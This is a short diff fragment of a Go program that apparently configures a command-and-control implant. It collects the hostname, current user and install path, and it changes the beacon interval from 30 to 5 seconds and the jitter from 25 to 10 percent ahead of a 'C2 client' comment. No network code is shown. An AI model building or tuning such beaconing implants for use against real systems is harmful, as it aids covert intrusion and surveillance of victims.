@@ -2141,8 +2141,8 @@ func main() {
 		MachineName:    hostname,
 		UserName:       currentUser.Username,
 		InstallPath:    exePath,
-		BeaconInterval: 30 * time.Second,
-		JitterPercent:  25,
+		BeaconInterval: 5 * time.Second,
+		JitterPercent:  10,
 	}
 
 	// C2 client
